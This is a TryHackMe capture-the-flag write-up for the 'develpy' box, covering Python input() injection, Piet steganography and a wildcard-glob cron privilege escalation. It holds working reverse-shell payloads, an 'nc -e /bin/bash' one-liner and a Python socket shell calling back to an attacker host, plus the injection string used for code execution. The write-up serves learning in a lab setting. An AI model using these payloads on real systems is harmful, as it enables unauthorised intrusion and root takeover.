# BSides Guatemala — develpy — TryHackMe Writeup

**Target:** `TARGET_IP` (10.129.137.214 at time of solve)
**OS:** Linux (Ubuntu 16.04)
**Difficulty:** Medium
**Tech stack:** OpenSSH 7.2p2, custom Python daemon fronted by `socat` on port 10000
**Exploit chain:** Python `input()` injection on a `socat`-hosted Py2 script → reverse shell as `king` → Piet (`npiet`) PNG steganography → `c00ffe123!` → SSH as `king` → SSH local-port-forward to internal web → upload `.py` into a wildcard-glob cron path → root reverse shell

---

## Attack Chain Overview

```
nmap → 22, 10000 (snet-sensor-mgmt?)
    ↓
curl :10000 → Python traceback (Py2 input() on attacker bytes)
    ↓
echo "__import__('os').system('id')" | nc → uid=king
    ↓
nc reverse shell as king → user.txt
    ↓
ls home → credentials.png  +  exploit.py / run.sh / root.sh / root /company
    ↓
exfil credentials.png; strings/exiftool empty; image is npiet/Piet
    ↓
npiet credentials.png → c00ffe123!  (king's password)
    ↓
ssh king@$TARGET   (stable foothold)
    ↓
crontab: */1 root cd /root/company && bash run.sh → python /root/company/media/*.py
    ↓
netstat -tulpn → internal web on :8080 (file uploader)
    ↓
ssh -L 8080:localhost:8080 king@$TARGET  → upload reverse-shell .py
    ↓
cron tick → /bin/sh -i as root → root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Initial Access — Python `input()` Injection](#2-initial-access--python-input-injection)
3. [Post-Exploitation (`king`)](#3-post-exploitation-king)
4. [User Flag — Piet/npiet Steganography](#4-user-flag--pietnpiet-steganography)
5. [Privilege Escalation — Wildcard-Glob Cron + SSH Tunnel](#5-privilege-escalation--wildcard-glob-cron--ssh-tunnel)
6. [Root Flag](#6-root-flag)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
nmap -sS -Pn -n -p- --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,10000 $TARGET -oA service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.2p2 |
| 10000/tcp | `snet-sensor-mgmt?` — nmap couldn't classify |

The unidentified service is the entry point. See [nmap.md](../../tools/recon/nmap.md).

---

## 2. Initial Access — Python `input()` Injection

Full technique: [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).

Open `:10000` in a browser / `curl`:
```bash
curl http://$TARGET:10000/
# Private 0days
#  Please enther number of exploits to send??: Traceback (most recent call last):
#   File "./exploit.py", line 6, in <module>
#     num_exploits = int(input(' Please enther number of exploits to send??: '))
#   NameError: name 'GET' is not defined
```

Py `input()` evaluates its argument. Confirm + RCE:
```bash
echo "__import__('os').system('id')" | nc $TARGET 10000
# uid=1000(king) gid=1000(king) groups=1000(king),...
```

Reverse shell:
```bash
nc -lvnp 4444
echo "__import__('os').system('nc -e /bin/bash $LHOST 4444')" | nc $TARGET 10000
```

Stabilise:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

Tools: [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md) (which is what's hosting the script — see `cat run.sh` in §5).

---

## 3. Post-Exploitation (`king`)

Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md).

```bash
ls -lha
# -rwxrwxrwx 1 king king 266K Aug 27  2019 credentials.png
# -rwxrwxrwx 1 king king  408 Aug 25  2019 exploit.py
# -rw-r--r-- 1 root root   32 Aug 25  2019 root.sh
# -rw-rw-r-- 1 king king  139 Aug 25  2019 run.sh
# -rw-rw-r-- 1 king king   33 Aug 27  2019 user.txt
cat user.txt
```

`credentials.png` is the lead.

---

## 4. User Flag — Piet/npiet Steganography

Full technique: [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md).

Exfil and triage:
```bash
# Target
python3 -m http.server 8888
# Attacker
wget http://$TARGET:8888/credentials.png
strings credentials.png    # empty
exiftool credentials.png   # nothing useful
file credentials.png       # PNG, blocky grid of saturated colours → Piet
```

Run:
```bash
sudo apt install npiet
./npiet credentials.png
# c00ffe123!
```

Use it:
```bash
ssh king@$TARGET
# password: c00ffe123!
```

Tools: [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/strings.md), [wget](../../tools/web/wget.md).

---

## 5. Privilege Escalation — Wildcard-Glob Cron + SSH Tunnel

Full technique: [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md).

```bash
sudo -l                                  # nothing
cat /etc/crontab
# *  *    * * *   king    cd /home/king/ && bash run.sh
# *  *    * * *   root    cd /home/king/ && bash root.sh
# *  *    * * *   root    cd /root/company && bash run.sh

cat /home/king/run.sh
# socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &

cat root.sh
# python /root/company/media/*.py        ← wildcard glob, attacker-controlled dir
```

Confirm cron tick rate:
```bash
tail -f /var/log/syslog | grep -i cron
```

Find the internal web that drops files into `/root/company/media/`:
```bash
netstat -tulpn
# tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
```

Tunnel it:
```bash
ssh -L 8080:localhost:8080 king@$TARGET
# Browser → http://localhost:8080  (web uploader)
```

Drop a Python reverse shell `.py` through the uploader (it lands under `/root/company/media/`):
```python
import socket,subprocess,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$LHOST", 1337))
[os.dup2(s.fileno(), f) for f in (0, 1, 2)]
subprocess.call(["/bin/sh", "-i"])
```

Listener + wait:
```bash
nc -lvnp 1337
# … one minute later …
# whoami → root
```

See [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) for the SSH forward, and [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md) for the wildcard variant.

---

## 6. Root Flag

```bash
cat /root/root.txt
```

---

## 7. Key Takeaways

- An unidentified service replying with a Python traceback is almost always Py2 `input()` or a direct interpretation primitive. `echo "1+1" | nc` is a free probe; if it computes, you have RCE.
- `socat ... EXEC:./script,pty,stderr` is a debug pattern — when you find it, the script behind it is your foothold. Always read `run.sh` after landing.
- Image files in user homes that don't yield to `strings` / `exiftool` / `steghide` and **look like Mondrian** are Piet. Run them through `npiet`.
- Wildcard globs in cron lines (`python /opt/.../*.py`, `tar cf - *`, `chown -R user *`) are attacker-controlled if you can write to the glob dir. The cron line itself doesn't need to be writable.
- Internal-only HTTP services (`netstat -tulpn` shows `127.0.0.1:8080`) are reachable via SSH local port forward once you have any user account.

---

## Related Notes
- [python-input-injection.md](../../exploits/web-rce/python-input-injection.md) — initial access
- [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md) — user-flag steganography
- [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md) — wildcard-glob privesc variant
- [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) — internal web pivot
- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md) — playbook backbone
- [nmap](../../tools/recon/nmap.md), [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md), [wget](../../tools/web/wget.md) — recon & delivery
- [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/strings.md) — image triage
